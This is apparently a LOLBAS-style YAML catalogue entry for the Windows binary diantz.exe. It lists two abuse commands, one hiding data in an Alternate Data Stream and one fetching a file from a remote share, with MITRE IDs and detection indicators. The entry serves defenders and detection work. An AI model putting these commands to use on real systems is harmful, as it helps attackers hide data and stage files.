---
Name: Diantz.exe
Description: Binary that package existing files into a cabinet (.cab) file
Author: 'Tamir Yehuda'
Created: 2020-08-08
Commands:
  - Command: diantz.exe c:\pathToFile\file.exe c:\destinationFolder\targetFile.txt:targetFile.cab
    Description: Compress taget file into a cab file stored in the Alternate Data Stream (ADS) of the target file.
    Usecase: Hide data compressed into an Alternate Data Stream.
    Category: ADS
    Privileges: User
    MitreID: T1564.004
    OperatingSystem: Windows XP, Windows vista, Windows 7, Windows 8, Windows 8.1.
  - Command: diantz.exe \\remotemachine\pathToFile\file.exe c:\destinationFolder\file.cab
    Description: Download and compress a remote file and store it in a cab file on local machine.
    Usecase: Download and compress into a cab file.
    Category: Download
    Privileges: User
    MitreID: T1105
    OperatingSystem: Windows Server 2012, Windows Server 2012R2, Windows Server 2016, Windows Server 2019
Full_Path:
  - Path: c:\windows\system32\diantz.exe
  - Path: c:\windows\syswow64\diantz.exe
Code_Sample:
  - Code:
Detection:
  - IOC: diantz storing data into alternate data streams.
  - IOC: diantz getting a file from a remote machine or the internet.
Resources:
  - Link: https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/diantz
Acknowledgement:
  - Person: Tamir Yehuda
    Handle: '@tim8288'
  - Person: Hai Vaknin
    Handle: '@vakninhai'
---
